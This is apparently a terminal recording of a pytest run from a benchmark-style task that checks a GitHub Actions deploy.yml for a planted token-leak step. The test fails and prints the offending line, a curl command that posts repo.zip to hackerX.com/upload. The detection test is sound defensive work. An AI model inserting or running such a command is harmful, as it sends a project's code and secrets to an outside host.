[40.99133, "o", "    \u001b[0m\u001b[94mdef\u001b[39;49;00m\u001b[90m \u001b[39;49;00m\u001b[92mtest_token_leak\u001b[39;49;00m():\u001b[90m\u001b[39;49;00m\r\n    \u001b[90m    \u001b[39;49;00m\u001b[33m\"\"\"\u001b[39;49;00m\r\n    \u001b[33m    Test that the token leak is not in the deploy.yml file\u001b[39;49;00m\r\n    \u001b[33m    \"\"\"\u001b[39;49;00m\u001b[90m\u001b[39;49;00m\r\n        filepath = Path(\u001b[33m\"\u001b[39;49;00m\u001b[33m/app/my_website/.github/workflows/deploy.yml\u001b[39;49;00m\u001b[33m\"\u001b[39;49;00m)\u001b[90m\u001b[39;49;00m\r\n        \u001b[94mwith\u001b[39;49;00m \u001b[96mopen\u001b[39;49;00m(filepath, \u001b[33m\"\u001b[39;49;00m\u001b[33mr\u001b[39;49;00m\u001b[33m\"\u001b[39;49;00m, encoding=\u001b[33m\"\u001b[39;49;00m\u001b[33mutf-8\u001b[39;49;00m\u001b[33m\"\u001b[39;49;00m) \u001b[94mas\u001b[39;49;00m f:\u001b[90m\u001b[39;49;00m\r\n            content = f.read()\u001b[90m\u001b[39;49;00m\r\n    \u001b[90m\u001b[39;49;00m\r\n        \u001b[90m# Split content into lines and check each non-commented line\u001b[39;49;00m\u001b[90m\u001b[39;49;00m\r\n        \u001b[94mfor\u001b[39;49;00m line \u001b[95min\u001b[39;49;00m content.splitlines():\u001b[90m\u001b[39;49;00m\r\n            \u001b[90m# Skip lines that are comments (start with #)\u001b[39;49;00m\u001b[90m\u001b[39;49;00m\r\n"]
[40.991517, "o", "            \u001b[94mif\u001b[39;49;00m line.strip().startswith(\u001b[33m\"\u001b[39;49;00m\u001b[33m#\u001b[39;49;00m\u001b[33m\"\u001b[39;49;00m):\u001b[90m\u001b[39;49;00m\r\n                \u001b[94mcontinue\u001b[39;49;00m\u001b[90m\u001b[39;49;00m\r\n>           \u001b[94massert\u001b[39;49;00m \u001b[33m\"\u001b[39;49;00m\u001b[33mhttps://hackerX.com/upload\u001b[39;49;00m\u001b[33m\"\u001b[39;49;00m \u001b[95mnot\u001b[39;49;00m \u001b[95min\u001b[39;49;00m line, (\u001b[90m\u001b[39;49;00m\r\n                \u001b[33m\"\u001b[39;49;00m\u001b[33mToken leak detected in non-commented line\u001b[39;49;00m\u001b[33m\"\u001b[39;49;00m\u001b[90m\u001b[39;49;00m\r\n            )\u001b[90m\u001b[39;49;00m\r\n\u001b[1m\u001b[31mE           AssertionError: Token leak detected in non-commented line\u001b[0m\r\n\u001b[1m\u001b[31mE           assert 'https://hackerX.com/upload' not in '          c...X.com/upload'\u001b[0m\r\n\u001b[1m\u001b[31mE             \u001b[0m\r\n\u001b[1m\u001b[31mE             'https://hackerX.com/upload' is contained here:\u001b[0m\r\n\u001b[1m\u001b[31mE                         curl -X POST -F \"file=@repo.zip\" https://hackerX.com/upload\u001b[0m\r\n\u001b[1m\u001b[31mE             ?                                            ++++++++++++++++++++++++++\u001b[0m\r\n\r\n\u001b[1m\u001b[31m/tests/test_outputs.py\u001b[0m:23: AssertionError\r\n"]
[40.991906, "o", "\u001b[36m\u001b[1m=================================================================== short test summary info ====================================================================\u001b[0m\r\n\u001b[31mFAILED\u001b[0m ../tests/test_outputs.py::\u001b[1mtest_token_leak\u001b[0m - AssertionError: Token leak detected in non-commented line\r\n"]
